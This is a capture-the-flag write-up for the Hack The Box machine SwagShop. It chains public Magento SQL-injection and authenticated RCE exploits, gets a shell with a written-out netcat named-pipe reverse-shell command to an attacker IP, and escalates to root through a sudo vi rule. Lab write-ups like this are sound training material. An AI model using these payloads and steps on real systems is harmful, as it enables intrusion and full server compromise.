# SwagShop [HTB](https://app.hackthebox.com/machines/188)
![swagshop-01](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/SwagShop/img/swagshop-01.png)

## Recon

After adding an entry for the target in my `/etc/hosts` file, I start scanning for open ports:

```bash
nmap -p- --min-rate 10000 swagshop.htb
```

![ports-02](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/SwagShop/img/ports-02.png)

Let's run a service and version detection scan on these two ports:

```bash
nmap -p 80,22 -sCV swagshop.htb -oN nmap.result
```

![nmap-res-03](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/SwagShop/img/nmap-res-03.png)

We have the following:

+ An SSH server on port 22.
+ An Apache V2.4.29 server on port 80.

Only two ports are open. We should primarly focus on the Apache server to try and get access to the system. 

### Apache Port 80

Let's take a look at the website at `http://swagshop.htb`

![site-04](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/SwagShop/img/site-04.png)

We can see this is a e-commerce shop, selling various items. Right at the top we can see a logo for [Magento](https://en.wikipedia.org/wiki/Magento). A quick Google search teels us that Magento is an open-source e-commerce CMS platform written in PHP. Magento was purchesed by Adobe in May 2018 for $1.68 billion. 

All of this is nice and all, but does it have any exploits? 

```bash
searchsploit Magento
```

![exploits-05](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/SwagShop/img/exploits-05.png)

My eyes immediately went for the two RCE exploits `php/webapps/37811.py` and `xml/webapps/37977.py`. I took a look at both with `searchsploit -x <exploit_path>`. 

The first exploit, `php/webapps/37811.py`, requires admin authentication. We dont have credentials just yet, nor did we find the admin login portal url. 

Then I took a look at the second RCE exploit at `xml/webapps/37977.py`:

![overview-06](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/SwagShop/img/overview-06.png)

Altough this exploit is labeled as RCE, to my understanding this exploit doesnt perform any RCE at all. Instead, it creates a new admin account using SQL injection:

![query-07](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/SwagShop/img/query-07.png)

This query is then packed into a POST request to the target URL at `/admin/Cms_Wysiwyg/directive/index/`:

![packed-08](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/SwagShop/img/packed-08.png)

If the server replies with a 200 status code for this POST request, the exploit determines a successful result. I dont see any RCE payload being formulated or executed in this exploit. 

What we can do, is use this exploit to get into the admin panel, and then use the previous exploit to pull off RCE. 

If we examine the first exploit, we can see a payload is created:

![payload-09](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/SwagShop/img/payload-09.png)

The exploit then instantiates a mechanzie browser in order to formulate a POST form to login:

![machanize-10](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/SwagShop/img/machanize-10.png)

The exploit sets the username and password values and sends the form to the server. The response is then captured into the `content` variable. 

The exploit then performs a regex search on the `content` variable in order to find two values, `url` and `key`. 

![content-11](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/SwagShop/img/content-11.png)

Once it has the values, the exploit formulates a new url using these values, requests this new url, then runs another regex search to find a third value called `tunnel`. 

Finally, this `tunnel` value is used along with the payload to create the final exploit url, and this is executed by requsting the final url. Overall, the exploit looks solid. 

To sum up, We have two vulnerabilities we are going to chain. We have an SQLi exploit to get us inside the admin panel, which will allow us to pull of a second exploit to gain RCE.

But before we do any of that, we have to find the admin portal url. Let's run a directory and file scan:

```bash
ffuf -w /usr/share/wordlists/seclists/SecLists-master/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -u http://swagshop.htb/FUZZ -e .php,.cgi,.txt,.xml,.html
```

Here are some of the results from the scan:

![ffuf-12](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/SwagShop/img/ffuf-12.png)

The `index.php` is the script that runs the main page. The `media` has nothing interesting inside of it, same goes for the `includes` directory. 

![ffuf-13](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/SwagShop/img/ffuf-13.png)

I tried running the `install.php` script, but it fails saying the CMS has already been installed. The `lib` directory has nothing interesting inside of it. The `app` directory has XML configuration files, but nothing super useful. 

![ffuf-14](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/SwagShop/img/ffuf-14.png)


The `js` has nothing interesting inside of it. The `api.php` file returns `Invalid webservice adapter specified`, whatever that means. Although the `shell` directory sounds enticing, it doesnt help us at all. There are 4 php scripts inside it, but we can't interact with or view thier contents. 

There were also other results that I didnt mention here because the story is overall the same. Nothing super useful, and definitely no admin page. Which means, the admin page has to be deeper in the website's directory tree, the question is where? 

I looked into every directory that came up in the scan, and I didnt find the admin panel. Which leaves us with one option, the `index.php` file. Becasue this is the script that runs the main page of the site, the admin panel could very well be hidden behind it. 

Let's run another directory and file scan using:

```bash
ffuf -w /usr/share/wordlists/seclists/SecLists-master/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -u http://swagshop.htb/index.php/FUZZ -e .php,.cgi,.txt,.xml,.html
```

Which returns this:

![ffuf-15](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/SwagShop/img/ffuf-15.png)


If we open the following url at `http://swagshop.htb/index.php/admin` we get the admin portal:

![admin-portal-16](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/SwagShop/img/admin-portal-16.png)


Let's try to pull of the SQLi exploit. 

### SQLi 

Let's go over the exploit to see if we need to modify anything. 

Right below the library imports we see a `target` varaible being set:

![target-17](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/SwagShop/img/target-17.png)

We need to set this value to the url path right up to the admin portal. So I put `http://swagshop.htb/index.php` as the value. 


After that we need to remove all of the comments and text that breaks the syntax and we should be good to go, so let's give it a shot. 

```bash
python2 SQLi.py
```

![sqli-18](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/SwagShop/img/sqli-18.png)

It says that it worked, lets try to login with `forme : forme`:

![logged-in-19](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/SwagShop/img/logged-in-19.png)

It did work!! Which means the RCE exploit should work as well. Also down at the buttom we can see the Megento version is in fact `1.9.0.0`:

![version-20](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/SwagShop/img/version-20.png)

Let's move on to the RCE exploit.


### RCE

Let's go over the exploit to see if we need to modify anything.

Right at the top we need to set the `username`, `password` and `install_date` variabels:

![variables-21](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/SwagShop/img/variables-21.png)

We have the credentials from the previous step. The install date we can find in `/app/etc/local.xml` as the comment outlines:

![install-date-22](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/SwagShop/img/install-date-22.png)

Lets copy this string and assign it to the `install_date` variable. After that we should be good to go. 

Let's execute the exploit with:

```bash
python2 rce.py http://swagshop.htb/index.php/admin "id"
```

Where:

+ `http://swagshop.htb/index.php/admin` is the target url to the admin login form. 
+ `"id"` is the command to execute in quotes. 

![fail-23](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/SwagShop/img/fail-23.png)

We get an error of `more then one control matching name ...` from the `mechanize` module. While searching this error online, I found [this](https://stackoverflow.com/questions/35226169/clientform-ambiguityerror-more-than-one-control-matching-name) stackoverflow page. 

Based on this page, the error occurs becasue the are multiple username fields in the form, hence the Ambiguous error. The stackoverflow page suggested indexing the correct username field with the `nr` argument using the `find_control` method on the mechanzie browser instance. 

However before I implemented this solution I went over the exploit source code once again:

![line-24](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/SwagShop/img/line-24.png)


This highlighted line jumped to my mind. We can see the author added a comment saying that we had to add manaul control for the username field. I dont know why this was added, but I decided to comment this line out since we have an issue with the `username` field in our form. Maybe this is what's causing the issue? 

After that I ran the exploit again and this time it worked:

![works-25](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/SwagShop/img/works-25.png)

As you can see, the `id` command executed on the target and we got the output. Now we need to find a working payload for a reverse shell. 

After several failed atempts, Ive found that `rm -f /tmp/f;mknod /tmp/f p;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.69 443 >/tmp/f` works for me to get a shell. 

So i start the listener with:

```bash
rlwrap nc -lncp 443
```

And execute the exploit with:

```bash
python2 rce.py http://swagshop.htb/index.php/admin "rm -f /tmp/f;mknod /tmp/f p;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.69 443 >/tmp/f"
```

This hangs the shell instance, but on my `nc` shell I get a connection:

![shell-26](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/SwagShop/img/shell-26.png)


## Privilege Escalation

After landing on the machine I start a TTY shell with:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

![tty-27](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/SwagShop/img/tty-27.png)

After that I start hunting down for quick wins, primarily I check for any and all `sudo` permissions:

```bash
sudo -l
```

![sudo-28](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/SwagShop/img/sudo-28.png)

We can see that we are able to edit any file inside the `/var/www/html` directory using the `vi` editor.
This is bad, because `vi` has command execution capabilities while editing a file, as well as when invoking the `vi` program itself by using the `-c` switch. This is also documented in [GTFObins](https://gtfobins.github.io/gtfobins/vi/#sudo).


To exploit this we need to get into a `vi` session by editing a file:

```bash
sudo /usr/bin/vi /var/www/html/LICENSE.txt
```

The `vi` program will not function proparly because we dont have a true terminal, but this doesnt matter because we are not interested in editing any files, we just want to spwan a shell. 

To do that all we need to do is hit the `ESC` key one time, then press the `:` key and type in `/bin/bash`, then hit enter. This is how you can execute OS commands while inside the vi editor.

And since this `vi` process has been created by root via sudo, the spawned shell should be owned by root as well:

![root-29](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/SwagShop/img/root-29.png)

